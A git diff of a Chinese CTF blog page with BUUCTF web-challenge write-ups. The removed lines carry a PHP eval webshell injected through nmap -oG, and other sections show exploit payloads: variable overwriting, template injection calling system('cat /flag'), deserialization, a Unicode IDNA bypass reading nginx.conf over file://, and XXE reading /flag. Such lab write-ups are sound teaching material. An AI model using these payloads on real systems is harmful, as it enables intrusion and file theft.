@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="sunzy">
   <meta name="keywords" content="">
-  <title>buuoj-z7z8 - 一路走到黑</title>
+  <title>buuctf-z7z8 - 一路走到黑</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      2.4k 字
+      4.7k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      38
+      72
        分钟
     </span>
   
@@ -237,17 +237,17 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">buuoj-z7z8</h1>
+            <h1 style="display: none">buuctf-z7z8</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：19 小时前
+                  本文最后更新于：9 分钟前
                 
               </p>
             
             <div class="markdown-body" id="post-body">
-              <p>这篇是buuoj上的其他题型的集合</p>
-<h1 id="buuoj-z7z8"><a href="#buuoj-z7z8" class="headerlink" title="buuoj-z7z8"></a>buuoj-z7z8</h1><a id="more"></a>
+              <p>这篇是buuctf上的其他题型的集合</p>
+<h1 id="buuctf-z7z8"><a href="#buuctf-z7z8" class="headerlink" title="buuctf-z7z8"></a>buuctf-z7z8</h1><a id="more"></a>
 
 <h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
@@ -307,11 +307,11 @@ $host = escapeshellcmd($host);
 <span class="hljs-string">' 1'</span>\<span class="hljs-string">''</span>shellcode <span class="hljs-string">'</span>
 <span class="hljs-string">'</span> <span class="hljs-number">1</span><span class="hljs-string">'\\'</span><span class="hljs-string">'shellcode \'</span></code></pre></div>
 
-<p>构造的一句话木马为：<code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
+<p>构造的一句话木马为：<code>&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39;</code></p>
 <p>运行结果为：<code>&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></p>
 <p>这里的单引号都是成对出现的，所以没影响</p>
 <p>payload:</p>
-<div class="hljs"><pre><code class="hljs xml">?host=' <span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">"hack"</span>]);<span class="hljs-meta">?&gt;</span></span> -oG hack.php '</code></pre></div>
+<div class="hljs"><pre><code class="hljs xml">?host=' <span class="php"><span class="hljs-meta">&lt;?php</span> @shellcode<span class="hljs-meta">?&gt;</span></span> -oG hack.php '</code></pre></div>
 
 <p><img src="https://i.loli.net/2020/10/24/1kHWE9zFn6L3XsB.png" srcset="/img/loading.gif" alt="online1.png"></p>
 <p>上传文件的保存路径，利用蚁剑链接一下</p>
@@ -461,39 +461,39 @@ $txt = base64_encode(file_get_contents($file));<span class="hljs-comment">//这�
 <p><img src="https://i.loli.net/2020/10/24/lfOzTIEwbBJDaMx.png" srcset="/img/loading.gif" alt="web-3.png"></p>
 <p>参考： <a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p>
 <h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖</p>
-<div class="hljs"><pre><code class="hljs awk">&lt;?php
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-include <span class="hljs-string">'flag.php'</span>;
+<span class="hljs-keyword">include</span> <span class="hljs-string">'flag.php'</span>;
 
-<span class="hljs-variable">$yds</span> = <span class="hljs-string">"dog"</span>;
-<span class="hljs-variable">$is</span> = <span class="hljs-string">"cat"</span>;
-<span class="hljs-variable">$handsome</span> = <span class="hljs-string">'yds'</span>;
+$yds = <span class="hljs-string">"dog"</span>;
+$is = <span class="hljs-string">"cat"</span>;
+$handsome = <span class="hljs-string">'yds'</span>;
 
-foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<span class="hljs-regexp">//</span><span class="hljs-variable">$flag</span>=flag
-    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>;
+<span class="hljs-keyword">foreach</span>($_POST <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;<span class="hljs-comment">//$flag=flag</span>
+    $$x = $y;
 &#125;
-<span class="hljs-variable">$flag</span> = flag 
+$flag = flag 
 
-foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  <span class="hljs-regexp">//y</span>ds=flag
-    $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>; <span class="hljs-regexp">//</span><span class="hljs-variable">$yds</span> = <span class="hljs-variable">$flag</span> 
+<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;  <span class="hljs-comment">//yds=flag</span>
+    $$x = $$y; <span class="hljs-comment">//$yds = $flag </span>
 &#125;
 
-foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;
-    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'flag'</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-regexp">//</span> yds=flag
-        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);
+<span class="hljs-keyword">foreach</span>($_GET <span class="hljs-keyword">as</span> $x =&gt; $y)&#123;
+    <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">'flag'</span>] === $x &amp;&amp; $x !== <span class="hljs-string">'flag'</span>)&#123; <span class="hljs-comment">// yds=flag</span>
+        <span class="hljs-keyword">exit</span>($handsome);
     &#125;
 &#125;
 
-<span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'flag'</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'flag'</span>]))&#123;
-    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'flag'</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'flag'</span>]))&#123;
+    <span class="hljs-keyword">exit</span>($yds);
 &#125;
 
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;
-    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);
+<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>  || $_GET[<span class="hljs-string">'flag'</span>] === <span class="hljs-string">'flag'</span>)&#123;
+    <span class="hljs-keyword">exit</span>($is);
 &#125;
 
 
-echo <span class="hljs-string">"the flag is: "</span>.<span class="hljs-variable">$flag</span>;</code></pre></div>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">"the flag is: "</span>.$flag;</code></pre></div>
 
 <p>poyload:</p>
 <div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag
@@ -506,7 +506,7 @@ POST: <span class="hljs-variable">$flag</span>=flag</code></pre></div>
 <p>首先试试<code>system(&quot;ls /&quot;)</code>,但是发现没有被执行，于是家上括号<code>{system(&quot;ls /&quot;)}</code>，这次执行成功</p>
 <p><img src="https://i.loli.net/2020/10/24/EGtFP2INmuhgroY.png" srcset="/img/loading.gif" alt="ip-1.png"></p>
 <p>最后获取flag, <code>{system(cat /flag)}</code></p>
-<h2 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">"exec"</span>,<span class="hljs-string">"shell_exec"</span>,<span class="hljs-string">"system"</span>,<span class="hljs-string">"passthru"</span>,<span class="hljs-string">"proc_open"</span>,<span class="hljs-string">"show_source"</span>,<span class="hljs-string">"phpinfo"</span>,<span class="hljs-string">"popen"</span>,<span class="hljs-string">"dl"</span>,<span class="hljs-string">"eval"</span>,<span class="hljs-string">"proc_terminate"</span>,<span class="hljs-string">"touch"</span>,<span class="hljs-string">"escapeshellcmd"</span>,<span class="hljs-string">"escapeshellarg"</span>,<span class="hljs-string">"assert"</span>,<span class="hljs-string">"substr_replace"</span>,<span class="hljs-string">"call_user_func_array"</span>,<span class="hljs-string">"call_user_func"</span>,<span class="hljs-string">"array_filter"</span>, <span class="hljs-string">"array_walk"</span>,  <span class="hljs-string">"array_map"</span>,<span class="hljs-string">"registregister_shutdown_function"</span>,<span class="hljs-string">"register_tick_function"</span>,<span class="hljs-string">"filter_var"</span>, <span class="hljs-string">"filter_var_array"</span>, <span class="hljs-string">"uasort"</span>, <span class="hljs-string">"uksort"</span>, <span class="hljs-string">"array_reduce"</span>,<span class="hljs-string">"array_walk"</span>, <span class="hljs-string">"array_walk_recursive"</span>,<span class="hljs-string">"pcntl_exec"</span>,<span class="hljs-string">"fopen"</span>,<span class="hljs-string">"fwrite"</span>,<span class="hljs-string">"file_put_contents"</span>);
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span><span class="hljs-params">($func, $p)</span> </span>&#123;
         $result = call_user_func($func, $p);
@@ -554,6 +554,351 @@ $a-&gt;func=<span class="hljs-string">"system"</span>;
 <span class="hljs-keyword">print</span>(urlencode(serialize($a)));
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span>
+<span class="hljs-comment">#encoding=utf-8</span>
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> urllib
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> json
+reload(sys)
+sys.setdefaultencoding(<span class="hljs-string">'latin1'</span>)
+
+app = Flask(__name__)
+
+secert_key = os.urandom(<span class="hljs-number">16</span>)
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, action, param, sign, ip)</span>:</span>
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)): <span class="hljs-comment">#SandBox For Remote_Addr</span>
+            os.mkdir(self.sandbox)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span><span class="hljs-params">(self)</span>:</span>
+        result = &#123;&#125;
+        result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
+        <span class="hljs-keyword">if</span> (self.checkSign()):
+            <span class="hljs-keyword">if</span> <span class="hljs-string">"scan"</span> <span class="hljs-keyword">in</span> self.action:
+                tmpfile = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'w'</span>)
+                resp = scan(self.param)
+                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">"Connection Timeout"</span>):
+                    result[<span class="hljs-string">'data'</span>] = resp
+                <span class="hljs-keyword">else</span>:
+                    <span class="hljs-keyword">print</span> resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
+            <span class="hljs-keyword">if</span> <span class="hljs-string">"read"</span> <span class="hljs-keyword">in</span> self.action:
+                f = open(<span class="hljs-string">"./%s/result.txt"</span> % self.sandbox, <span class="hljs-string">'r'</span>)
+                result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">200</span>
+                result[<span class="hljs-string">'data'</span>] = f.read()
+            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'code'</span>] == <span class="hljs-number">500</span>:
+                result[<span class="hljs-string">'data'</span>] = <span class="hljs-string">"Action Error"</span>
+        <span class="hljs-keyword">else</span>:
+            result[<span class="hljs-string">'code'</span>] = <span class="hljs-number">500</span>
+            result[<span class="hljs-string">'msg'</span>] = <span class="hljs-string">"Sign Error"</span>
+        <span class="hljs-keyword">return</span> result
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+<span class="hljs-comment">#generate Sign For Action Scan.</span>
+<span class="hljs-meta">@app.route("/geneSign", methods=['GET', 'POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span><span class="hljs-params">()</span>:</span>
+    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
+    action = <span class="hljs-string">"scan"</span>
+    <span class="hljs-keyword">return</span> getSign(action, param)
+
+<span class="hljs-meta">@app.route('/De1ta',methods=['GET','POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span><span class="hljs-params">()</span>:</span>
+    action = urllib.unquote(request.cookies.get(<span class="hljs-string">"action"</span>))
+    param = urllib.unquote(request.args.get(<span class="hljs-string">"param"</span>, <span class="hljs-string">""</span>))
+    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">"sign"</span>))
+    ip = request.remote_addr
+    <span class="hljs-keyword">if</span>(waf(param)):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"No Hacker!!!!"</span>
+    task = Task(action, param, sign, ip)
+    <span class="hljs-keyword">return</span> json.dumps(task.Exec())
+<span class="hljs-meta">@app.route('/')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> open(<span class="hljs-string">"code.txt"</span>,<span class="hljs-string">"r"</span>).read()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span><span class="hljs-params">(param)</span>:</span>
+    socket.setdefaulttimeout(<span class="hljs-number">1</span>)
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"Connection Timeout"</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span><span class="hljs-params">(action, param)</span>:</span>
+    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(content)</span>:</span>
+    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span><span class="hljs-params">(param)</span>:</span>
+    check=param.strip().lower()
+    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">"gopher"</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">"file"</span>):
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    app.debug = <span class="hljs-literal">False</span>
+    app.run(host=<span class="hljs-string">'0.0.0.0'</span>,port=<span class="hljs-number">80</span>)</code></pre></div>
+
+
+
+<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>题目给出了源码</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-meta">@app.route('/getUrl', methods=['GET', 'POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUrl</span><span class="hljs-params">()</span>:</span>
+    url = request.args.get(<span class="hljs-string">"url"</span>)  <span class="hljs-comment"># 获取get提交的url参数</span>
+    host = parse.urlparse(url).hostname <span class="hljs-comment">#获取url中的主机名</span>
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:            
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 111"</span>
+    parts = list(urlsplit(url))       <span class="hljs-comment">#将url分隔开 协议类型 主机名 文件路径 存入列表 parts[1]为主机名</span>
+    host = parts[<span class="hljs-number">1</span>]
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 222 "</span> + host
+    newhost = []
+    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
+        newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))   <span class="hljs-comment">#将主机名以.为分割 进行utf-8解码</span>
+    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)         <span class="hljs-comment">#重新组成主机名</span>
+    <span class="hljs-comment">#去掉 url 中的空格</span>
+    finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
+    host = parse.urlparse(finalUrl).hostname   <span class="hljs-comment"># 获取新的主机名   </span>
+    <span class="hljs-keyword">if</span> host == <span class="hljs-string">'suctf.cc'</span>:
+        <span class="hljs-keyword">return</span> urllib.request.urlopen(finalUrl).read()
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"我扌 your problem? 333"</span>
+   
+    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;
+    &lt;!-- Do you know the nginx? --&gt;</code></pre></div>
+
+
+
+<p>考察点1：</p>
+<blockquote>
+<p>2019black hat一个议题</p>
+<div class="hljs"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>.blackhat.com<span class="hljs-regexp">/USA-19/</span>Thursday<span class="hljs-regexp">/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</span></code></pre></div>
+
+<p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/10/29/5ixom8Hq7UYdRBV.png" srcset="/img/loading.gif" alt="utf-8.png"></p>
+<p>考察点2:</p>
+<blockquote>
+<p>Nginx服务器</p>
+<p><a href="https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细</a></p>
+<p>这里只要知道nginx服务器的主要文件路径</p>
+<p>配置文件存放目录：/etc/nginx </p>
+<p>主配置文件：/etc/nginx/conf/nginx.conf </p>
+<p>管理脚本：/usr/lib64/systemd/system/nginx.service </p>
+<p>模块：/usr/lisb64/nginx/modules </p>
+<p>应用程序：/usr/sbin/nginx </p>
+<p>程序默认存放位置：/usr/share/nginx/html </p>
+<p>日志默认存放位置：/var/log/nginx </p>
+<p>配置文件目录为：/usr/local/nginx/conf/nginx.conf  //这题要用到的路径</p>
+</blockquote>
+<p>这里要读取的是文件，所以使用的file协议</p>
+<p>直接够造</p>
+<div class="hljs"><pre><code class="hljs vim"><span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span>
+利用漏洞改为
+<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">c</span>℆sr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>
+
+<p>给出flag路径</p>
+<div class="hljs"><pre><code class="hljs crmsh">server &#123; listen <span class="hljs-number">80</span>; <span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123; try_files</span> $uri @app; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">@app</span> &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; <span class="hljs-keyword">location</span> <span class="hljs-title">/static</span> &#123; alias /app/static; &#125; <span class="hljs-comment"># location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span>
+ 
+构造
+file://suctf.c℆sr/fffffflag
+
+拿到flag</code></pre></div>
+
+<p>为了直观感受url处理过程，写了脚本</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlsplit, urlunsplit
+url= <span class="hljs-string">"file://suctf.c℆sr/local/nginx/conf/nginx.conf"</span>
+host = parse.urlparse(url).hostname
+<span class="hljs-comment">#print(host)</span>
+parts = list(urlsplit(url))
+print(parts)
+newhost=[]
+<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">'.'</span>):
+    newhost.append(h.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>))
+print(newhost)
+parts[<span class="hljs-number">1</span>] = <span class="hljs-string">'.'</span>.join(newhost)
+print(parts)
+finalUrl = urlunsplit(parts).split(<span class="hljs-string">' '</span>)[<span class="hljs-number">0</span>]
+print(finalUrl)</code></pre></div>
+
+<p>结果</p>
+<div class="hljs"><pre><code class="hljs vim">[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.c℆sr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
+[<span class="hljs-string">'suctf'</span>, <span class="hljs-string">'cc/usr'</span>]
+[<span class="hljs-string">'file'</span>, <span class="hljs-string">'suctf.cc/usr'</span>, <span class="hljs-string">'/local/nginx/conf/nginx.conf'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>]
+<span class="hljs-keyword">file</span>://suctf.<span class="hljs-keyword">cc</span>/usr/local/nginx/<span class="hljs-keyword">conf</span>/nginx.<span class="hljs-keyword">conf</span></code></pre></div>
+
+
+
+<p>找出类似可用字符的脚本</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">128</span>,<span class="hljs-number">65537</span>):
+    tmp=chr(i)
+    <span class="hljs-keyword">try</span>:
+        res = tmp.encode(<span class="hljs-string">'idna'</span>).decode(<span class="hljs-string">'utf-8'</span>)
+        <span class="hljs-keyword">if</span>(<span class="hljs-string">"-"</span>) <span class="hljs-keyword">in</span> res:
+            <span class="hljs-keyword">continue</span>
+        print(<span class="hljs-string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">pass</span></code></pre></div>
+
+<hr>
+<p>参考：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/qq_42181428/article/details/99741920" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
+</blockquote>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><code>xxe</code>攻击</p>
+<p>抓包显示的结果是</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>a<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>
+
+<p>是xml格式的数据，所以可能存在xxe漏洞（外部实体注入），即利用输入位置向存储的表中添加一个外部实体，让这个实体包含内部文件，造成数据泄露。</p>
+<p>xml注入是利用闭合标签改写XML文件实现更改数据，xxe是引用外部实体来达到目的。</p>
+<p>php引用外部实体，常见的协议</p>
+<div class="hljs"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径 如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span>
+<span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txt
+php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php</code></pre></div>
+
+<p>这篇博客写的很清楚，<a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">传送门</a></p>
+<p>直接构造payload，拿到flag</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
+<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"file:///flag"</span>&gt;</span></span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>
+
+<blockquote>
+<!ENTITY file SYSTEM  "file:///flag">
+
+<p>这里的file是外部实体</p>
+<p><username>&file;</username></p>
+<p>这里的&amp;file是xml中的参数</p>
+</blockquote>
+<p>还可以用php://filter/read=convert.base64-encode/resource=xxx.php,读取源码</p>
+<p>直接构造</p>
+<div class="hljs"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">hack</span> [</span>
+<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span>  <span class="hljs-meta-string">"php://filter/read=convert.base64-encode/resource=doLogin.php"</span>&gt;</span></span>
+<span class="hljs-meta">]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>aa<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div>
+
+<p>解码后的源码，可以拿到admin和密码，但是登录也没啥东西，考察点就是xxe。。。</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment">* autor: c0ny1</span>
+<span class="hljs-comment">* date: 2018-2-7</span>
+<span class="hljs-comment">*/</span>
+
+$USERNAME = <span class="hljs-string">'admin'</span>; <span class="hljs-comment">//璐﹀彿</span>
+$PASSWORD = <span class="hljs-string">'024b87931a03f738fff6693ce0a78c88'</span>; <span class="hljs-comment">//瀵嗙爜</span>
+$result = <span class="hljs-keyword">null</span>;
+
+libxml_disable_entity_loader(<span class="hljs-keyword">false</span>);
+$xmlfile = file_get_contents(<span class="hljs-string">'php://input'</span>);
+
+<span class="hljs-keyword">try</span>&#123;
+	$dom = <span class="hljs-keyword">new</span> DOMDocument();
